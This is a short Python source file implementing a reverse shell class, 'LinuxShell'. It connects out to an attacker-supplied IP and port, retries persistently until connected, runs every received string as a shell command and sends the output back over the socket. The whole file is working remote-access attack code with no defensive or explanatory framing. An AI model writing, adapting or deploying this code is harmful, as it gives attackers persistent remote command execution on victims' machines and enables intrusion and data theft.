import base64
import socket
import subprocess
import time

class LinuxShell:

    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connectionFlag = False

    def connect(self):
        try:
            self.sock.connect((self.server_ip, int(self.server_port)))
            self.sock.send('\n[+] Connection Established from {}\n\n'.format(self.sock.getsockname()).encode('utf-8'))
            self.connectionFlag = True
            self.run()
        except socket.error:
            self.connectionFlag = False
            while not self.connectionFlag:
                try:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.connect((self.server_ip, int(self.server_port)))
                    self.sock.send('\n[+] Connection Established from {}\n\n'.format(self.sock.getsockname()).encode('utf-8'))
                    self.connectionFlag = True
                    self.run()
                except socket.error:
                    self.connectionFlag = False
                    time.sleep(1.23)

    def run(self):
        try:
            while self.connectionFlag:
                data = self.sock.recv(1024)
                if 'exit' in data.decode('UTF-8'):
                    self.connectionFlag = False
                    self.sock.send('\n[-] Connection from {} closed\n\n'.format(self.sock.getsockname()).encode('utf-8'))
                    self.connect()
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                #encoded = base64.b64encode(stdout_value)
                #sock.send(encoded)
                self.sock.send(stdout_value)
        except Exception as e:
            print(e)
            #self.connect()
            pass

    def isConnected(self):
        return self.connectionFlag

    def close(self):
        self.sock.close()
